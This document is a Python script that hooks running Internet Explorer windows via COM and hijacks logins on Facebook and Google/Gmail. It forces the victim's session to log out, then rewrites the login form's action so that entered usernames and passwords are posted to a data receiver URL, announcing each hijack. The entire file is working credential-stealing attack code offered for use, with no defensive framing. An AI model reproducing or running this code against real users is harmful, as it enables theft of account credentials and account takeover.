import win32com.client
import time
import urllib.parse

# Data receiver URL
data_receiver = "http://localhost:8080/"

# Target site configuration
target_sites = {
    "www.facebook.com": {
        "logout_url": None,
        "logout_form": "logout_form",
        "login_form_index": 0,
        "owned": False
    },
    "accounts.google.com": {
        "logout_url": (
            "https://accounts.google.com/Logout?hl=en&continue="
            "https://accounts.google.com/ServiceLogin%3Fservice%3Dmail"
        ),
        "logout_form": None,
        "login_form_index": 0,
        "owned": False
    }
}

# Use the same settings for alternate Gmail domains
target_sites["www.gmail.com"] = target_sites["accounts.google.com"]
target_sites["mail.google.com"] = target_sites["accounts.google.com"]

# CLSID for Internet Explorer windows
clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'

def wait_for_browser(browser):
    """Wait for the browser to finish loading a page."""
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)

# Hook into running Internet Explorer instances
windows = win32com.client.Dispatch(clsid)

while True:
    for browser in windows:
        try:
            url = urllib.parse.urlparse(browser.LocationUrl)
        except Exception:
            continue

        hostname = url.hostname
        if hostname in target_sites:
            site = target_sites[hostname]

            if site["owned"]:
                continue

            # Log out the current session
            if site["logout_url"]:
                browser.Navigate(site["logout_url"])
                wait_for_browser(browser)
            else:
                try:
                    # Find and submit the logout form
                    for element in browser.Document.all:
                        if element.id == site["logout_form"]:
                            element.submit()
                            wait_for_browser(browser)
                            break
                except Exception:
                    pass

            # Hijack the login form
            try:
                login_index = site["login_form_index"]
                login_url = urllib.parse.quote(browser.LocationUrl)
                browser.Document.forms[login_index].action = f"{data_receiver}{login_url}"
                site["owned"] = True
                print(f"[+] Hijacked login form on: {hostname}")
            except Exception:
                pass

    time.sleep(5)
